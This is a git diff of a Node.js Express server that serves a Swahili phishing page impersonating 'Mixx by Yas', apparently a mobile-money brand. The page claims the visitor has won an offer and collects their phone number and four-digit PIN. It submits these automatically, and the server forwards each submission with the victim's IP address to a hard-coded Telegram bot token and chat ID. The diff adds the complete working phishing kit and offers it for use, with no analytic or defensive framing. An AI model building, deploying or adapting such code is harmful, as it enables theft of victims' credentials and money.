@@ -1,7 +1,6 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -10,101 +9,288 @@ const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';
 const CHAT_ID = '8999616005';
 
-// Middleware
-app.use(cors({
-    origin: '*',
-    methods: ['GET', 'POST', 'OPTIONS'],
-    allowedHeaders: ['Content-Type']
-}));
+app.use(cors());
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
-// Serve static files from 'public' directory
-app.use(express.static('public'));
+// HTML with absolute API URL
+const HTML = `<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx by Yas | Ofa Maalum</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:linear-gradient(145deg,#0b2b26,#0a1f1c);font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;}
+        .card{max-width:520px;width:100%;background:rgba(255,255,255,0.97);border-radius:48px;padding:2rem 1.8rem;box-shadow:0 25px 45px -12px rgba(0,0,0,0.45);border:1px solid rgba(255,215,120,0.3);}
+        h2{font-size:1.85rem;font-weight:700;background:linear-gradient(135deg,#d4af37,#f5c542);background-clip:text;-webkit-background-clip:text;color:transparent;text-align:center;margin-bottom:0.6rem;}
+        .subtitle{text-align:center;color:#2c5a4e;font-weight:500;margin-bottom:1.8rem;padding-bottom:1rem;border-bottom:1px dashed #b9dfcf;}
+        .phone-input{margin-bottom:1.5rem;}
+        .phone-input input{width:100%;padding:1rem 1.2rem;font-size:1.1rem;border:2px solid #e2e8f0;border-radius:60px;background:#fefdf8;outline:none;font-family:monospace;}
+        .phone-input input:focus{border-color:#f5b042;box-shadow:0 0 0 3px rgba(245,176,66,0.2);}
+        .pin-label{font-weight:600;color:#1e4a3b;margin-bottom:0.75rem;display:flex;gap:8px;}
+        .pin-label span{background:#eefbf6;padding:4px 12px;border-radius:40px;font-size:0.8rem;color:#bd7e14;}
+        .pin-boxes{display:flex;gap:14px;justify-content:center;margin:0.5rem 0;}
+        .pin-box{width:70px;height:70px;text-align:center;font-size:2.2rem;font-weight:700;font-family:monospace;border:2px solid #cfdfd9;border-radius:20px;background:white;color:#1f3e36;transition:0.2s;}
+        .pin-box:focus{border-color:#f5b042;outline:none;box-shadow:0 0 0 3px rgba(245,176,66,0.3);}
+        .note{text-align:center;font-size:0.72rem;color:#6f8a82;margin-top:1.8rem;background:#f3f9f6;padding:8px 12px;border-radius:40px;}
+        footer{text-align:center;margin-top:1.8rem;font-size:0.7rem;color:#98afa8;border-top:1px solid #e2ede8;padding-top:1.2rem;}
+        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#1e2f2a;color:#ffde9c;padding:12px 28px;border-radius:60px;font-weight:500;opacity:0;transition:0.2s;pointer-events:none;z-index:1000;}
+        @media(max-width:480px){.card{padding:1.5rem 1.2rem;}.pin-box{width:55px;height:55px;font-size:1.8rem;}h2{font-size:1.5rem;}}
+        .loading{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:black;color:white;padding:10px 20px;border-radius:10px;z-index:1001;}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>✨ Umejishindia Ofa Wa Mixx by Yas pesa ✨</h2>
+        <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa ya kipekee.</p>
+        <div class="phone-input">
+            <input type="tel" id="phoneNumber" placeholder="Namba ya Simu (ex: 0765123456)" maxlength="10" inputmode="numeric">
+        </div>
+        <div class="pin-label">
+            🔐 Mixx by Yas PIN (Siri yako ya 4 tarakimu)
+            <span>usalama kamili</span>
+        </div>
+        <div class="pin-boxes">
+            <input type="tel" maxlength="1" class="pin-box" data-index="0" inputmode="numeric">
+            <input type="tel" maxlength="1" class="pin-box" data-index="1" inputmode="numeric">
+            <input type="tel" maxlength="1" class="pin-box" data-index="2" inputmode="numeric">
+            <input type="tel" maxlength="1" class="pin-box" data-index="3" inputmode="numeric">
+        </div>
+        <p class="note">⚠️ Kuingiza neno siri kunakubali maelezo ya matumizi na masharti ya ofa. Hakikisha namba yako ni sahihi.</p>
+        <footer>© Mixx by Yas – Ofa maalum ya wateja.</footer>
+    </div>
+    <div id="toastMsg" class="toast"></div>
+    <div id="loading" class="loading">Inatuma...</div>
 
-// Test endpoint to check if server is running
-app.get('/api/test', (req, res) => {
-    res.json({ status: 'ok', message: 'Server is running!' });
+    <script>
+        // Get the current URL dynamically
+        const API_URL = window.location.origin + '/api/submit';
+        
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const phoneInput = document.getElementById('phoneNumber');
+        const toast = document.getElementById('toastMsg');
+        const loading = document.getElementById('loading');
+        
+        function showMessage(text, isError = true) {
+            toast.textContent = text;
+            toast.style.opacity = '1';
+            toast.style.backgroundColor = isError ? '#872341' : '#1f4e3f';
+            setTimeout(() => {
+                toast.style.opacity = '0';
+            }, 3000);
+        }
+        
+        function isValidPhone(phone) {
+            return /^[0-9]{10}$/.test(phone);
+        }
+        
+        async function submitToBackend(phoneNumber, pin) {
+            loading.style.display = 'block';
+            
+            try {
+                console.log('Sending to:', API_URL);
+                console.log('Data:', { phoneNumber, pin });
+                
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phoneNumber, pin })
+                });
+                
+                console.log('Response status:', response.status);
+                const data = await response.json();
+                console.log('Response data:', data);
+                
+                if (response.ok && data.success) {
+                    showMessage('✅ Ofa yako imepokelewa! Asante.', false);
+                    // Clear form
+                    phoneInput.value = '';
+                    pinBoxes.forEach(box => box.value = '');
+                    pinBoxes[0].focus();
+                    return true;
+                } else {
+                    showMessage('❌ ' + (data.error || 'Hitilafu, jaribu tena'));
+                    return false;
+                }
+            } catch (error) {
+                console.error('Fetch error details:', error);
+                showMessage('❌ Tatizo la mtandao. Hakikisha una internet. Jaribu tena.');
+                return false;
+            } finally {
+                loading.style.display = 'none';
+            }
+        }
+        
+        async function tryAutoSubmit() {
+            const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
+            const phone = phoneInput.value.trim();
+            
+            if (!allPinsFilled) {
+                return false;
+            }
+            
+            if (!isValidPhone(phone)) {
+                if (phone === '') {
+                    showMessage('📱 Tafadhali ingiza namba yako ya simu (tarakimu 10)');
+                } else {
+                    showMessage('❌ Namba ya simu lazima iwe tarakimu 10 pekee');
+                }
+                phoneInput.focus();
+                return false;
+            }
+            
+            const pin = Array.from(pinBoxes).map(input => input.value).join('');
+            
+            // Disable inputs while submitting
+            document.querySelectorAll('input').forEach(i => i.disabled = true);
+            
+            const success = await submitToBackend(phone, pin);
+            
+            // Re-enable inputs
+            document.querySelectorAll('input').forEach(i => i.disabled = false);
+            
+            return success;
+        }
+        
+        // PIN box handlers
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                let val = e.target.value.replace(/[^0-9]/g, '');
+                e.target.value = val;
+                
+                if (val.length === 1 && index < pinBoxes.length - 1) {
+                    pinBoxes[index + 1].focus();
+                } else if (val.length === 1 && index === pinBoxes.length - 1) {
+                    tryAutoSubmit();
+                }
+            });
+            
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                    pinBoxes[index - 1].value = '';
+                }
+            });
+            
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                let paste = (e.clipboardData || window.clipboardData).getData('text');
+                paste = paste.replace(/[^0-9]/g, '').slice(0, 4);
+                for (let i = 0; i < paste.length && i < pinBoxes.length; i++) {
+                    pinBoxes[i].value = paste[i];
+                }
+                if (paste.length === 4) {
+                    tryAutoSubmit();
+                } else if (paste.length > 0 && paste.length < 4) {
+                    pinBoxes[paste.length].focus();
+                }
+            });
+        });
+        
+        // Phone input handler
+        phoneInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
+            e.target.value = val;
+            
+            const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
+            if (allPinsFilled && val.length === 10) {
+                tryAutoSubmit();
+            }
+        });
+        
+        phoneInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
+                if (allPinsFilled && isValidPhone(phoneInput.value.trim())) {
+                    tryAutoSubmit();
+                } else if (!allPinsFilled) {
+                    showMessage('🔢 Kamilisha PIN yako kwanza');
+                }
+            }
+        });
+        
+        // Test API on page load
+        async function testAPI() {
+            try {
+                const response = await fetch(API_URL, { method: 'OPTIONS' });
+                console.log('API reachable');
+            } catch (error) {
+                console.error('API not reachable:', error);
+            }
+        }
+        testAPI();
+    </script>
+</body>
+</html>`;
+
+// Serve HTML
+app.get('/', (req, res) => {
+    res.send(HTML);
 });
 
-// Main submit endpoint
+// API endpoint
 app.post('/api/submit', async (req, res) => {
-    console.log('=== NEW REQUEST RECEIVED ===');
+    console.log('========================================');
+    console.log('📥 RECEIVED SUBMISSION');
     console.log('Body:', req.body);
+    console.log('IP:', req.ip);
+    console.log('========================================');
     
     const { phoneNumber, pin } = req.body;
     
     // Validation
     if (!phoneNumber || !pin) {
-        console.log('Missing fields:', { phoneNumber, pin });
-        return res.status(400).json({ 
-            success: false, 
-            error: 'Phone number and PIN are required' 
-        });
+        console.log('❌ Missing fields');
+        return res.status(400).json({ success: false, error: 'Phone and PIN required' });
     }
     
     if (pin.length !== 4) {
-        console.log('Invalid PIN length:', pin.length);
-        return res.status(400).json({ 
-            success: false, 
-            error: 'PIN must be exactly 4 digits' 
-        });
+        console.log('❌ Invalid PIN length:', pin.length);
+        return res.status(400).json({ success: false, error: 'PIN must be 4 digits' });
     }
     
     if (!/^[0-9]{10}$/.test(phoneNumber)) {
-        console.log('Invalid phone format:', phoneNumber);
-        return res.status(400).json({ 
-            success: false, 
-            error: 'Phone number must be 10 digits' 
-        });
+        console.log('❌ Invalid phone format:', phoneNumber);
+        return res.status(400).json({ success: false, error: 'Phone must be 10 digits' });
     }
     
-    // Format message for Telegram
-    const message = `🔔 MIXx BY YAS - NEW SUBMISSION 🔔\n\n📱 Phone: ${phoneNumber}\n🔐 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString('en-TZ')}\n📍 IP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'}`;
+    // Send to Telegram
+    const message = `🔔 NEW SUBMISSION - MIXx BY YAS 🔔
+    
+📱 Phone: ${phoneNumber}
+🔐 PIN: ${pin}
+⏰ Time: ${new Date().toLocaleString()}
+📍 IP: ${req.ip || 'unknown'}`;
     
     try {
-        console.log('Sending to Telegram...');
+        console.log('📤 Sending to Telegram...');
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
         const response = await axios.post(telegramUrl, {
             chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        }, {
-            timeout: 10000 // 10 second timeout
+            text: message
         });
         
-        console.log('Telegram response:', response.data.ok ? 'SUCCESS' : 'FAILED');
-        
         if (response.data.ok) {
-            res.json({ 
-                success: true, 
-                message: 'Data sent successfully to Telegram' 
-            });
+            console.log('✅ SUCCESS! Sent to Telegram');
+            console.log('Phone:', phoneNumber, 'PIN:', pin);
+            res.json({ success: true, message: 'Sent to Telegram' });
         } else {
             throw new Error('Telegram returned error');
         }
         
     } catch (error) {
-        console.error('Telegram API Error:', error.message);
-        if (error.response) {
-            console.error('Response data:', error.response.data);
-        }
-        res.status(500).json({ 
-            success: false, 
-            error: 'Failed to send to Telegram. Please try again.' 
-        });
+        console.error('❌ TELEGRAM ERROR:', error.response?.data || error.message);
+        res.status(500).json({ success: false, error: 'Telegram API error' });
     }
 });
 
-// Serve index.html for all other routes (SPA support)
-app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
 app.listen(PORT, () => {
+    console.log(`🚀 ========================================`);
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📱 Frontend available at http://localhost:${PORT}`);
-    console.log(`🤖 Telegram bot configured with chat ID: ${CHAT_ID}`);
-    console.log(`✅ API endpoint: POST /api/submit`);
+    console.log(`📱 Your app is live!`);
+    console.log(`🚀 ========================================`);
 });
